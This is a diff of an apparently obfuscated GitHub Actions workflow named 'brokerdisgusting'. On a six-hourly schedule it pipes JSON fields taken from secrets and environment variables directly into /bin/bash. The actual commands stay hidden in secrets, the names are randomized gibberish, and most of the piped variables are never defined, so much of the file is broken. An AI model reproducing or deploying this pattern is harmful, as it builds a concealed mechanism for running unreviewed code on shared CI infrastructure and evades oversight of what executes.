@@ -1,19 +1,29 @@
 name: brokerdisgusting
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 5/6 * * *'
+    - cron: '42 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: brokerdisgusting
         env:
-          kte854: ${{ secrets.kte854 }}
+          a24: ${{ secrets.a24 }}
         run: |
-          echo $kte854 | jq -r .wmop79346 | /bin/bash
-          echo $v8080 | jq -r .nxmme299 | /bin/bash
-          echo $cgzhb7896 | jq -r .uoms35701 | /bin/bash
-          echo $ei7026 | jq -r .jrdu4 | /bin/bash
+          echo $a24 | jq -r .m5 | /bin/bash
+          echo $qjviy1 | jq -r .ai0825 | /bin/bash
+          echo $ilzq7435 | jq -r .wsps2902 | /bin/bash
+          echo $nq350 | jq -r .rab03942 | /bin/bash
+          echo $ljm9 | jq -r .i68816 | /bin/bash
+          echo $ms871 | jq -r .ddzln20562 | /bin/bash
+          echo $y41 | jq -r .cahla1 | /bin/bash
+          echo $n542 | jq -r .vofj81258 | /bin/bash
+          echo $fcf60 | jq -r .zmyi11078 | /bin/bash
+          echo $vdgle64108 | jq -r .jtrj206 | /bin/bash
+          echo $e8 | jq -r .yh12341 | /bin/bash
+          echo $hitw75 | jq -r .mc57 | /bin/bash
 
